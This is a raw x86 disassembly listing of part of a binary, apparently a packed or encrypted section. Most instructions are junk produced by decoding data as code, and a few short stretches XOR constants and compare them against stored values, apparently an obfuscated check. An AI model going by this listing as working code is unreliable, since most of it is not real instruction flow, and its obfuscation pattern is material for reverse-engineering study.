  41b247:	pushf  
  41b248:	mov    ch,0x15
  41b24a:	push   edx
  41b24b:	ror    DWORD PTR [ebx-0x6f7196dd],cl
  41b251:	lods   al,BYTE PTR ds:[esi]
  41b252:	out    dx,al
  41b253:	fiadd  DWORD PTR [edx+0x49]
  41b256:	push   ebp
  41b257:	cmp    esi,esi
  41b259:	loop   0x41b213
  41b25b:	or     eax,esp
  41b25d:	sbb    eax,DWORD PTR [edi-0x10]
  41b260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b261:	pop    es
  41b262:	scas   eax,DWORD PTR es:[edi]
  41b263:	add    bl,bh
  41b265:	mov    esi,0xe4a3b21a
  41b26a:	(bad)  
  41b26b:	cmp    BYTE PTR [esp+edx*1-0x39],dh
  41b26f:	loopne 0x41b232
  41b271:	cmp    al,0xce
  41b273:	xor    ah,0x58
  41b276:	jb     0x41b274
  41b278:	mov    ch,0x6a
  41b27a:	mov    al,0x70
  41b27c:	pop    edx
  41b27d:	test   al,0x3f
  41b27f:	push   ebx
  41b280:	adc    dh,BYTE PTR [edx+0x23]
  41b283:	in     eax,dx
  41b284:	(bad)  
  41b286:	xchg   esi,eax
  41b287:	ss stc 
  41b289:	cmp    bh,0xf9
  41b28c:	fadd   st,st(5)
  41b28e:	adc    BYTE PTR [esi+edi*4-0x6170c40],dl
  41b295:	dec    esp
  41b296:	and    DWORD PTR [esi+0x15],ebp
  41b299:	mov    ?,WORD PTR [ebx-0x23]
  41b29c:	iret   
  41b29d:	retf   
  41b29e:	cmp    ebx,DWORD PTR [esi]
  41b2a0:	xchg   esp,eax
  41b2a1:	inc    esp
  41b2a2:	dec    esi
  41b2a3:	shl    DWORD PTR ds:0xd7e8a407,0x34
  41b2aa:	(bad)  
  41b2ac:	pop    ds
  41b2ad:	js     0x41b2ba
  41b2af:	in     eax,dx
  41b2b0:	sbb    al,0xd0
  41b2b2:	add    bl,ah
  41b2b4:	into   
  41b2b5:	sti    
  41b2b6:	inc    eax
  41b2b7:	pop    esi
  41b2b8:	dec    ebx
  41b2b9:	fs mov fs,edi
  41b2bc:	(bad)  
  41b2bd:	stc    
  41b2be:	es popf 
  41b2c0:	outs   dx,BYTE PTR ds:[esi]
  41b2c1:	jmp    0x77e32c41
  41b2c6:	hlt    
  41b2c7:	mov    al,BYTE PTR ds:0xee27c714
  41b2cd:	jbe    0x41b2e5
  41b2cf:	inc    edx
  41b2d0:	add    ebx,esp
  41b2d2:	jmp    0x41b29d
  41b2d4:	or     eax,0x4e4f5be2
  41b2d9:	mov    esp,0x70e6e2d7
  41b2de:	dec    ecx
  41b2df:	jmp    0x41b34e
  41b2e1:	push   0x14cbd033
  41b2e6:	mov    ds:0x8d244c6b,al
  41b2eb:	stos   DWORD PTR es:[edi],eax
  41b2ec:	push   es
  41b2ed:	cmp    eax,0xbedb4f0f
  41b2f2:	and    eax,0x31677c6
  41b2f7:	xor    DWORD PTR [esi],ecx
  41b2f9:	ret    0xd321
  41b2fc:	cs push es
  41b2fe:	test   DWORD PTR [ebx],ebp
  41b300:	pop    edx
  41b301:	dec    ebx
  41b302:	test   eax,0xbd06ad7a
  41b307:	mov    ah,0x0
  41b309:	mov    al,ds:0x2c63f21d
  41b30e:	pop    edx
  41b30f:	push   edi
  41b310:	adc    eax,0xbaf00982
  41b315:	xchg   ebx,eax
  41b316:	into   
  41b317:	gs xchg esi,eax
  41b319:	test   BYTE PTR [esi+0x71],0x3a
  41b31d:	jne    0x41b2ac
  41b31f:	mov    ah,0xb6
  41b321:	push   es
  41b322:	ret    
  41b323:	or     BYTE PTR [edi+0x6a],ah
  41b326:	out    0x69,eax
  41b328:	inc    ebx
  41b329:	hlt    
  41b32a:	lods   al,BYTE PTR ds:[esi]
  41b32b:	sar    BYTE PTR [esi],cl
  41b32d:	arpl   WORD PTR ds:0x98c7e3ec,cx
  41b333:	sbb    eax,0x80a2ff5e
  41b338:	in     eax,dx
  41b339:	pusha  
  41b33a:	adc    al,0x77
  41b33c:	iret   
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	push   esp
  41b368:	push   eax
  41b369:	in     al,dx
  41b36a:	mov    esi,0x18168fbb
  41b36f:	mov    esp,0xd1181812
  41b374:	(bad)  
  41b375:	pop    edi
  41b376:	clc    
  41b377:	aad    0x44
  41b379:	js     0x41b3c7
  41b37b:	aam    0x5d
  41b37d:	ret    
  41b37e:	into   
  41b37f:	jl     0x41b3af
  41b381:	mov    ebp,esp
  41b383:	paddb  mm1,mm1
  41b386:	shl    BYTE PTR [edi-0x72b4409c],0xa5
  41b38d:	call   0x31cd:0x43243ace
  41b394:	sub    dl,BYTE PTR [ebx+0x36]
  41b397:	ss push ss
  41b399:	aam    0x47
  41b39b:	(bad)  
  41b39c:	imul   ebx,DWORD PTR [edi],0x22
  41b39f:	out    0x27,eax
  41b3a1:	repz dec esp
  41b3a3:	(bad)  
  41b3a4:	mov    ebp,0x239ae0d3
  41b3a9:	pop    esi
  41b3aa:	push   edx
  41b3ab:	pop    esi
  41b3ac:	add    dh,ah
  41b3ae:	push   es
  41b3af:	in     eax,0xa2
  41b3b1:	cmp    cl,BYTE PTR [edx+0x20f8a49]
  41b3b7:	in     al,dx
  41b3b8:	fistp  WORD PTR [ebx-0x416823ec]
  41b3be:	push   cs
  41b3bf:	rsm    
  41b3c1:	mov    cl,0x8e
  41b3c3:	or     al,0x45
  41b3c5:	jne    0x41b38a
  41b3c7:	mov    es,eax
  41b3c9:	xor    bl,bl
  41b3cb:	or     al,0x43
  41b3cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ce:	cmp    DWORD PTR [edx+ecx*1-0x56],0x6a957551
  41b3d6:	dec    BYTE PTR [eax+0xd]
  41b3d9:	ficom  DWORD PTR [esi-0x22]
  41b3dc:	pop    edi
  41b3dd:	shl    DWORD PTR [edx-0x1],0xdd
  41b3e1:	das    
  41b3e2:	ins    BYTE PTR es:[edi],dx
  41b3e3:	mov    WORD PTR [ebp+0x600759ba],cs
  41b3e9:	dec    edx
  41b3ea:	sub    ah,al
  41b3ec:	es icebp 
  41b3ee:	pop    ss
  41b3ef:	xor    al,0xe6
  41b3f1:	(bad)  
  41b3f2:	repz dec ecx
  41b3f4:	lea    edx,[edi]
  41b3f6:	(bad)  
  41b3f7:	repnz sub al,0x3c
  41b3fa:	jb     0x41b462
  41b3fc:	pop    esp
  41b3fd:	aam    0xff
  41b3ff:	inc    eax
  41b400:	lock out dx,al
  41b402:	retf   
  41b403:	pop    eax
  41b404:	imul   edx,DWORD PTR [eax+0x3],0xffffffa4
  41b408:	mov    di,0x2b91
  41b40c:	push   esi
  41b40d:	push   eax
  41b40e:	sbb    al,0x4d
  41b410:	jge    0x41b3b5
  41b412:	xor    eax,ecx
  41b414:	sbb    DWORD PTR [edi-0x59c67ec4],ebp
  41b41a:	test   BYTE PTR [edx+esi*1],ah
  41b41d:	xchg   edx,eax
  41b41e:	icebp  
  41b41f:	pusha  
  41b420:	int3   
  41b421:	fmul   QWORD PTR [esi+0x53622e7a]
  41b427:	test   BYTE PTR [ebx-0x2c],al
  41b42a:	mov    eax,es:0xbc5102f7
  41b430:	push   cs
  41b431:	xlat   BYTE PTR ds:[ebx]
  41b432:	push   esp
  41b433:	or     al,BYTE PTR [eax+0x27a004c1]
  41b439:	xor    ch,BYTE PTR [edx+0x6e]
  41b43c:	cmp    dh,BYTE PTR [ebx-0x3]
  41b43f:	cmp    ebp,DWORD PTR [esi-0x53]
  41b442:	push   ss
  41b443:	xchg   edx,eax
  41b444:	xchg   edi,eax
  41b445:	and    eax,0xa1ab89e4
  41b44a:	out    dx,eax
  41b44b:	mov    ah,0xc2
  41b44d:	push   eax
  41b44e:	dec    ebp
  41b44f:	pop    ebp
  41b450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b451:	sub    dl,BYTE PTR [eax+ebp*2+0x225eb6c8]
  41b458:	and    BYTE PTR [ecx+0x13565ac4],dh
  41b45e:	in     al,dx
  41b45f:	rcr    DWORD PTR [ebx],1
  41b461:	aaa    
  41b462:	shr    BYTE PTR ds:0x9b5c8ef,cl
  41b468:	out    0x2d,eax
  41b46a:	out    dx,al
  41b46b:	add    al,0xdf
  41b46d:	data16 jle 0x41b472
  41b470:	(bad)  
  41b471:	rcl    BYTE PTR [ecx],cl
  41b473:	add    eax,0x9aad914
  41b478:	sbb    bh,BYTE PTR [esi]
  41b47a:	sbb    eax,0x8f18f1be
  41b47f:	sti    
  41b480:	(bad)  
  41b481:	outs   dx,DWORD PTR ds:[esi]
  41b483:	pop    edx
  41b484:	es mov ecx,0x1573c1be
  41b48a:	nop
  41b48b:	xchg   esp,eax
  41b48c:	jo     0x41b41d
  41b48e:	push   gs
  41b490:	sbb    esp,DWORD PTR [edi-0x6583005d]
  41b496:	mov    al,ds:0xbb1178be
  41b49b:	in     eax,0x69
  41b49d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b49e:	fdiv   DWORD PTR [edi+0x3f]
  41b4a1:	retf   0x2b48
  41b4a4:	mov    dh,0x63
  41b4a6:	xchg   esp,eax
  41b4a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4a8:	pusha  
  41b4a9:	or     eax,0x797185bc
  41b4ae:	add    eax,esp
  41b4b0:	xor    BYTE PTR [edi-0x6a0ab2b6],dh
  41b4b6:	out    0xa1,al
  41b4b8:	mov    al,ds:0xc5a532d0
  41b4bd:	sbb    DWORD PTR [eax],edi
  41b4bf:	fnstenv [ebx+0x485b98d4]
  41b4c5:	cdq    
  41b4c6:	push   0x1a6b843
  41b4cb:	lahf   
  41b4cc:	test   eax,0xfc559c4c
  41b4d1:	ss inc esi
  41b4d3:	popa   
  41b4d4:	ds jmp 0x41b488
  41b4d7:	xchg   ebx,eax
  41b4d8:	dec    esi
  41b4d9:	gs js  0x41b481
  41b4dc:	pop    ebx
  41b4dd:	jnp    0x41b483
  41b4df:	jo     0x41b4aa
  41b4e1:	cld    
  41b4e2:	adc    al,0xb4
  41b4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4e5:	out    dx,al
  41b4e6:	cmp    al,0x36
  41b4e8:	inc    ecx
  41b4e9:	cmp    dl,al
  41b4eb:	mov    ebx,0x4ef8a2c7
  41b4f0:	jmp    0xedc670c1
  41b4f5:	add    al,0x55
  41b4f7:	adc    esp,DWORD PTR [edi+0x1179da48]
  41b4fd:	mov    edi,0xc2a21897
  41b502:	cmp    DWORD PTR [edx],edx
  41b504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b505:	stc    
  41b506:	mov    dl,0xf0
  41b508:	sbb    DWORD PTR [edi-0x2ad30c54],ebx
  41b50e:	pop    esi
  41b50f:	mov    ch,0xc6
  41b511:	or     eax,0x27d9f302
  41b516:	sbb    eax,0xbddb31e4
  41b51b:	jmp    0x6172:0xd0f45cd1
  41b522:	jge    0x41b4f5
  41b524:	cmp    DWORD PTR [edx],ebx
  41b526:	loope  0x41b4e1
  41b528:	add    eax,0x2defb7f1
  41b52d:	or     BYTE PTR [eax],bh
  41b52f:	adc    BYTE PTR [ecx-0x66f21fee],cl
  41b535:	hlt    
  41b536:	lock cwde 
  41b538:	dec    esi
  41b539:	cmp    al,dh
  41b53b:	adc    eax,0x7ce96f9
  41b540:	dec    edx
  41b541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b542:	inc    edx
  41b543:	add    edx,DWORD PTR [eax+0x53b6ea0a]
  41b549:	adc    al,0x4b
  41b54b:	lds    esp,FWORD PTR gs:[edx-0x75]
  41b54f:	pop    esi
  41b550:	lods   al,BYTE PTR ds:[esi]
  41b551:	add    esp,eax
  41b553:	rol    BYTE PTR [edx+0x138094c2],cl
  41b559:	(bad)  
  41b55a:	scas   eax,DWORD PTR es:[edi]
  41b55b:	repnz lods al,BYTE PTR ds:[esi]
  41b55d:	xor    al,0x6f
  41b55f:	mov    al,0x89
  41b561:	jge    0x41b5af
  41b563:	xor    edi,esp
  41b565:	idiv   edi
  41b567:	add    BYTE PTR [ecx],dl
  41b569:	add    esi,ecx
  41b56b:	dec    ebx
  41b56c:	ja     0x41b57b
  41b56e:	sub    dh,BYTE PTR [ebx-0x5]
  41b571:	fsub   DWORD PTR [ebp+0x3b]
  41b574:	or     al,0xbb
  41b576:	ret    0x5413
  41b579:	aam    0x45
  41b57b:	inc    edx
  41b57c:	stc    
  41b57d:	ret    
  41b57e:	mov    al,0x93
  41b580:	clc    
  41b581:	adc    DWORD PTR [ebx],0x840b68ea
  41b587:	fwait
  41b588:	jnp    0x41b533
  41b58a:	into   
  41b58b:	mov    ds:0xbdbb8dad,al
  41b590:	adc    DWORD PTR [edi+0x4bae50d7],0x40
  41b597:	fadd   DWORD PTR [esi]
  41b599:	sub    ebx,edx
  41b59b:	pop    ecx
  41b59c:	addr16 pop eax
  41b59e:	rcr    DWORD PTR [ebx+edx*1+0x8],cl
  41b5a2:	xrelease mov DWORD PTR [ebp-0x7d],ebx
  41b5a6:	div    DWORD PTR [esi+0x31aee3c8]
  41b5ac:	je     0x41b57d
  41b5ae:	imul   ebx,DWORD PTR [ecx-0x32dcec18],0x58
  41b5b5:	aam    0x28
  41b5b7:	fwait
  41b5b8:	sbb    al,0xf4
  41b5ba:	push   ebx
  41b5bb:	and    al,0xbb
  41b5bd:	mov    esi,0x20b9d876
  41b5c2:	pop    ecx
  41b5c3:	pop    esp
  41b5c4:	pop    eax
  41b5c5:	xor    bh,BYTE PTR [ebp-0x57]
  41b5c8:	icebp  
  41b5c9:	pop    edi
  41b5ca:	mov    ebp,0x603bbd46
  41b5cf:	rol    DWORD PTR [ebp+ebx*1-0x6f],0x21
  41b5d4:	idiv   ebx
  41b5d6:	adc    BYTE PTR [edi-0x3567f26],dl
  41b5dc:	or     al,0x7b
  41b5de:	jmp    0x41b607
  41b5e0:	hlt    
  41b5e1:	sub    ax,WORD PTR [edx+0x253c7daa]
  41b5e8:	fs je  0x41b64f
  41b5eb:	mov    DWORD PTR [edx-0x4c6e9197],ebp
  41b5f1:	mov    fs,WORD PTR [esi-0x53]
  41b5f4:	mov    ebx,0x66baac01
  41b5f9:	ss (bad) 
  41b5fc:	test   eax,0xee311f08
  41b601:	sbb    BYTE PTR [ebx],ch
  41b603:	or     bh,cl
  41b605:	mov    edi,ds
  41b607:	cmp    esp,DWORD PTR [esi+esi*8+0x1ae0c0fc]
  41b60e:	mov    al,ds:0x5c3145d0
  41b613:	loopne 0x41b5da
  41b615:	adc    al,0x71
  41b617:	scas   eax,DWORD PTR es:[edi]
  41b618:	xchg   edi,eax
  41b619:	xchg   esi,eax
  41b61a:	call   0x6d4c2cc0
  41b61f:	xchg   DWORD PTR [eax],esp
  41b621:	fcmovnb st,st(5)
  41b623:	sub    cl,al
  41b625:	mov    al,0xd2
  41b627:	xor    bh,ah
  41b629:	push   0x7b1d5155
  41b62e:	mov    ecx,0xb0438b30
  41b633:	js     0x41b5e6
  41b635:	mov    dh,0xae
  41b637:	out    dx,eax
  41b638:	addr16 dec esp
  41b63a:	int3   
  41b63b:	test   DWORD PTR [eax-0x1dbdd7a4],ecx
  41b641:	mov    fs,WORD PTR [eax+esi*1+0x68]
  41b645:	push   cs
  41b646:	leave  
  41b647:	int3   
  41b648:	sbb    al,0x29
  41b64a:	jle    0x41b67b
  41b64c:	dec    DWORD PTR [esi]
  41b64e:	xchg   edx,eax
  41b64f:	xlat   BYTE PTR ds:[ebx]
  41b650:	out    dx,eax
  41b651:	fdivr  QWORD PTR [edi+0x3a]
  41b654:	icebp  
  41b655:	xor    esp,DWORD PTR [eax-0x60]
  41b658:	jecxz  0x41b62a
  41b65a:	lahf   
  41b65b:	daa    
  41b65c:	(bad)  
  41b65e:	sti    
  41b65f:	adc    BYTE PTR ds:0x6c9e4a3c,al
  41b665:	clc    
  41b666:	push   eax
  41b667:	in     al,dx
  41b668:	das    
  41b669:	dec    edx
  41b66a:	outs   dx,BYTE PTR ds:[esi]
  41b66b:	mov    WORD PTR [eax-0x2e],sp
  41b66f:	and    DWORD PTR [esi+edx*1-0x39],eax
  41b673:	out    dx,eax
  41b674:	or     BYTE PTR [edi-0x2a],dh
  41b677:	dec    ebx
  41b678:	xlat   BYTE PTR ds:[ebx]
  41b679:	mov    DWORD PTR [eax],ebp
  41b67b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b67c:	adc    esp,DWORD PTR [eax+ebp*4]
  41b67f:	popf   
  41b680:	aad    0x8e
  41b682:	add    eax,0x2d31680e
  41b687:	inc    edi
  41b688:	daa    
  41b689:	rcl    BYTE PTR [esi-0x72],1
  41b68c:	(bad)  
  41b68d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b68e:	cld    
  41b68f:	in     eax,dx
  41b690:	retf   
  41b691:	adc    eax,0x9b7b605b
  41b696:	pusha  
  41b697:	stc    
  41b698:	lods   al,BYTE PTR ds:[esi]
  41b699:	push   ebp
  41b69a:	jl     0x41b625
  41b69c:	jmp    0x36c91fd3
  41b6a1:	enter  0x9c6d,0x3a
  41b6a5:	mov    WORD PTR [esi+ecx*4-0x38],ss
  41b6a9:	jnp    0x41b633
  41b6ab:	jno    0x41b661
  41b6ad:	jl     0x41b6bc
  41b6af:	stc    
  41b6b0:	(bad)  
  41b6b1:	jg     0x41b6de
  41b6b3:	or     BYTE PTR [esi],bh
  41b6b5:	shr    BYTE PTR [edi-0x34],1
  41b6b8:	jecxz  0x41b6a6
  41b6ba:	xor    al,0x20
  41b6bc:	pop    ebp
  41b6bd:	inc    edi
  41b6be:	push   0x43
  41b6c0:	inc    edi
  41b6c1:	js     0x41b72e
  41b6c3:	push   eax
  41b6c4:	push   cs
  41b6c5:	loop   0x41b661
  41b6c7:	mov    edx,0xe1fb9c29
  41b6cc:	jmp    0x655f:0x6bfb929f
  41b6d3:	int3   
  41b6d4:	(bad)  [ebx]
  41b6d6:	lds    esp,FWORD PTR [esi-0x75f74c7d]
  41b6dc:	mov    al,0x7
  41b6de:	jo     0x41b66f
  41b6e0:	adc    DWORD PTR [edx-0x7b],esp
  41b6e3:	loop   0x41b6ff
  41b6e5:	mov    WORD PTR [eax+0x36],es
  41b6e8:	push   0xffffffc0
  41b6ea:	icebp  
  41b6eb:	push   ebx
  41b6ec:	pusha  
  41b6ed:	xor    al,0xc0
  41b6ef:	lahf   
  41b6f0:	retf   0x1c5c
  41b6f3:	pop    edx
  41b6f4:	inc    eax
  41b6f5:	mov    ?,WORD PTR [edx+0x1fc47e60]
  41b6fb:	ret    
  41b6fc:	dec    edx
  41b6fd:	push   esp
  41b6fe:	pusha  
  41b6ff:	cmc    
  41b700:	scas   eax,DWORD PTR es:[edi]
  41b701:	popa   
  41b702:	pusha  
  41b703:	ins    DWORD PTR es:[edi],dx
  41b704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b705:	jnp    0x41b727
  41b707:	push   0x8
  41b709:	mov    ecx,0x2bab75a
  41b70e:	jg     0x41b716
  41b710:	add    DWORD PTR [ecx+0x79],0x93b5c58
  41b717:	dec    esp
  41b718:	sbb    ch,BYTE PTR [ecx]
  41b71a:	push   ss
  41b71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b71c:	and    bl,BYTE PTR [edx-0x28]
  41b71f:	xchg   ebp,eax
  41b720:	stos   DWORD PTR es:[edi],eax
  41b721:	out    0x69,eax
  41b723:	inc    esi
  41b724:	jae    0x41b6e7
  41b726:	loopne 0x41b746
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225d4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225cc
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42255c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx-0x4e55d674],dh
  41b815:	arpl   WORD PTR [edi+0x70],bx
  41b818:	pop    esi
  41b819:	mov    DWORD PTR [esi],edx
  41b81b:	sbb    BYTE PTR [edx+edx*1+0x341f1818],bh
  41b822:	xor    ebp,DWORD PTR [esi]
  41b824:	mov    edx,0x4ac2a627
  41b829:	fst    QWORD PTR [eax-0x78688dec]
  41b82f:	or     DWORD PTR [ebp+edi*4+0x5ce448dd],ebx
  41b836:	or     al,0xfa
  41b838:	mov    cl,BYTE PTR [ecx-0x78332339]
  41b83e:	xchg   edx,eax
  41b83f:	shl    BYTE PTR [ebx],1
  41b841:	ds mov bl,0x1b
  41b844:	out    dx,eax
  41b845:	ret    0x7ebb
  41b848:	inc    ecx
  41b849:	mov    ds:0x527cd7c0,al
  41b84e:	lods   al,BYTE PTR ds:[esi]
  41b84f:	push   ds
  41b850:	cmp    al,0x6d
  41b852:	js     0x41b89f
  41b854:	repnz ds and eax,0x94e29a1a
  41b85b:	in     al,0x3f
  41b85d:	jg     0x41b89b
  41b85f:	xchg   BYTE PTR [edx-0x43],dl
  41b862:	outs   dx,BYTE PTR ds:[esi]
  41b863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b864:	push   ebx
  41b865:	dec    edx
  41b866:	add    ebx,DWORD PTR [edi]
  41b868:	adc    ebx,DWORD PTR [edi-0x64d8538f]
  41b86e:	adc    ecx,eax
  41b870:	pop    esp
  41b871:	and    al,0x41
  41b873:	in     al,0xbe
  41b875:	test   DWORD PTR [edi+0x5d],ebx
  41b878:	repnz pusha 
  41b87a:	mov    esp,0xb79f3108
  41b87f:	sub    BYTE PTR [esp+edx*1+0x3e],0xb6
  41b884:	psadbw mm5,QWORD PTR [ecx]
  41b887:	mov    DWORD PTR [ebx+0x4a],ebp
  41b88a:	push   esi
  41b88b:	push   ecx
  41b88c:	ins    DWORD PTR es:[edi],dx
  41b88d:	jne    0x41b8ae
  41b88f:	sbb    DWORD PTR [eax],0x23b4ba7e
  41b895:	jae    0x41b8d8
  41b897:	repnz lea ecx,[edi-0x38f8ecb]
  41b89e:	mov    eax,ds:0x5ab8fc0
  41b8a3:	mov    dl,0xd2
  41b8a5:	fcmovnb st,st(2)
  41b8a7:	retf   0x1a44
  41b8aa:	push   0x9fd8b28b
  41b8af:	mov    bh,0x65
  41b8b1:	jp     0x41b8d3
  41b8b3:	inc    edx
  41b8b4:	xchg   al,dh
  41b8b6:	pop    ebx
  41b8b7:	jnp    0x41b857
  41b8b9:	shl    ebp,0xc
  41b8bc:	add    DWORD PTR [ebp+0x301285c5],0x52457e81
  41b8c6:	mov    cl,0x98
  41b8c8:	(bad)  
  41b8c9:	mul    ah
  41b8cb:	cmp    DWORD PTR [eax-0x10284f94],0xffffff9c
  41b8d2:	ins    DWORD PTR es:[edi],dx
  41b8d3:	out    0x13,eax
  41b8d5:	test   BYTE PTR [edx-0x1d],bl
  41b8d8:	in     al,dx
  41b8d9:	and    eax,ebx
  41b8db:	xchg   BYTE PTR [ecx+eax*4-0x1f],al
  41b8df:	inc    ebp
  41b8e0:	add    bl,dh
  41b8e2:	retf   0xab3e
  41b8e5:	mov    edi,0x991dc4ec
  41b8ea:	push   ebp
  41b8eb:	add    ebp,DWORD PTR [esi]
  41b8ed:	daa    
  41b8ee:	push   0xffffffdd
  41b8f0:	jno    0x41b883
  41b8f2:	test   al,0x28
  41b8f4:	pop    ebx
  41b8f5:	or     BYTE PTR [ebp+ebp*4-0x4dbd6445],cl
  41b8fc:	inc    ebp
  41b8fd:	dec    edi
  41b8fe:	outs   dx,BYTE PTR ds:[esi]
  41b8ff:	mov    esi,0x53663d78
  41b904:	dec    edi
  41b905:	add    dh,BYTE PTR [ecx-0x315bcc1b]
  41b90b:	push   esp
  41b90c:	pop    ss
  41b90d:	dec    eax
  41b90e:	dec    edx
  41b90f:	jl     0x41b96d
  41b911:	jmp    0x7291:0x85e90c8a
  41b918:	xchg   edx,eax
  41b919:	enter  0xbbce,0x20
  41b91d:	mov    ecx,0x9d7598b5
  41b922:	add    BYTE PTR ds:0x34d49064,dh
  41b928:	int3   
  41b929:	cmp    bh,bl
  41b92b:	xchg   esp,eax
  41b92c:	aam    0x47
  41b92e:	push   ss
  41b92f:	test   eax,0xd177641f
  41b934:	sub    BYTE PTR [esi+0x13],ch
  41b937:	in     al,dx
  41b938:	inc    edi
  41b939:	push   edx
  41b93a:	in     al,dx
  41b93b:	cli    
  41b93c:	cdq    
  41b93d:	pop    ebp
  41b93e:	das    
  41b93f:	or     bh,BYTE PTR [esi+0x2f]
  41b942:	push   esi
  41b943:	ins    BYTE PTR es:[edi],dx
  41b944:	dec    ebx
  41b945:	inc    ecx
  41b946:	fist   WORD PTR [edi+0x2af45f0]
  41b94c:	(bad)  [edx-0x57]
  41b94f:	aas    
  41b950:	call   0x3f5f:0x6b8e6f93
  41b957:	inc    esp
  41b958:	push   ebx
  41b959:	jno    0x41b930
  41b95b:	and    cl,BYTE PTR [ebx]
  41b95d:	jb     0x41b998
  41b95f:	pop    edi
  41b960:	push   cs
  41b961:	in     al,dx
  41b962:	sti    
  41b963:	out    0xb,eax
  41b965:	inc    esi
  41b966:	sbb    eax,DWORD PTR [ebx+edi*8+0x39]
  41b96a:	mov    ecx,0xac9a9e4d
  41b96f:	aam    0xe3
  41b971:	cmp    esi,DWORD PTR [edi-0x16]
  41b974:	inc    esi
  41b975:	fcomip st,st(0)
  41b977:	repz fld QWORD PTR [ebp+0x7e]
  41b97b:	leave  
  41b97c:	sbb    BYTE PTR [edi-0x15],dh
  41b97f:	mov    dh,bh
  41b981:	pop    ebx
  41b982:	and    DWORD PTR [eax-0x50],esp
  41b985:	in     eax,dx
  41b986:	or     bl,BYTE PTR [edi-0x15]
  41b989:	xor    al,0x5c
  41b98b:	(bad)  
  41b98c:	std    
  41b98d:	xchg   esi,eax
  41b98e:	sahf   
  41b98f:	jge    0x41b99d
  41b991:	mov    edx,0x8a152c18
  41b996:	adc    DWORD PTR [ebp+eax*2+0x36],ebx
  41b99a:	fld    st(4)
  41b99c:	ins    DWORD PTR es:[edi],dx
  41b99d:	test   BYTE PTR [esi],0x54
  41b9a0:	xchg   esi,eax
  41b9a1:	inc    ebp
  41b9a2:	inc    eax
  41b9a3:	test   al,0x4e
  41b9a5:	out    0xc7,eax
  41b9a7:	data16 sahf 
  41b9a9:	ins    BYTE PTR es:[edi],dx
  41b9aa:	fidiv  DWORD PTR [edi+0x18af8da1]
  41b9b0:	mov    ch,0x80
  41b9b2:	xor    ecx,DWORD PTR [edx+eiz*8+0xa6bc89c]
  41b9b9:	dec    esp
  41b9ba:	push   ss
  41b9bb:	(bad)  
  41b9bc:	sahf   
  41b9bd:	(bad)  
  41b9be:	call   0x34eaf8f8
  41b9c3:	and    cl,BYTE PTR [ebx-0x5a424ede]
  41b9c9:	out    dx,eax
  41b9ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9cb:	add    BYTE PTR [edx],dl
  41b9cd:	jmp    0xef11:0x7b2a112c
